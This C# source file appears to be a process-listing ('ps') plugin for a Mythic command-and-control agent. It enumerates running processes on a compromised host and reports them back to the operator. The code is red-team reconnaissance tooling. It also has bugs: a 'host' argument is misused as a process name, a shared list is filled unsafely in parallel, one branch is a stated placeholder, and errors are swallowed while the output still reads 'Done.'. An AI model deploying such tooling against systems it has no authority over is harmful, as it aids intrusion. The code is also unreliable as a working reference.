using PluginBase;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Threading.Tasks;

namespace Plugin
{
    public static class ps
    {
        public static void Execute(Dictionary<string, object> args)
        {
            try
            {
                List<MythicProcessInfo> processes = new List<MythicProcessInfo>();



                //This can support remote computers, I just need to see if mythic supports it
                Process[] procs;

                if (args.ContainsKey("host"))
                {
                    procs = Process.GetProcessesByName(args["host"].ToString());
                }
                else if (args.ContainsKey("targetlist"))
                {
                    //do multiple remote process by target list like we do with get-sessions
                    procs = Process.GetProcesses(); //Temporary placeholder to  hide compile errors
                }
                else
                {
                    procs = Process.GetProcesses();
                }

                Parallel.ForEach(procs, proc =>
                {
                    try
                    {
                        processes.Add(new MythicProcessInfo()
                        {
                            process_id = proc.Id,
                            name = proc.ProcessName,
                            description = proc.MainWindowTitle,
                            bin_path = proc.MainModule.FileName,
                            start_time = proc.StartTime.ToString(),
                        });
                    }
                    catch
                    {
                        processes.Add(new MythicProcessInfo()
                        {
                            process_id = proc.Id,
                            name = proc.ProcessName,
                            description = proc.MainWindowTitle,
                        });
                    }
                });

                PluginHandler.AddResponse(new ProcessResponseResult
                {
                    task_id = (string)args["task-id"],
                    completed = "true",
                    user_output = "Done.",
                    processes = processes
                });
            }
            catch (Exception e)
            {
                PluginHandler.AddResponse(new ProcessResponseResult
                {
                    task_id = (string)args["task-id"],
                    completed = "true",
                    user_output = "Done.",
                    processes = new List<MythicProcessInfo>()
                });
            }
        }
    }
}
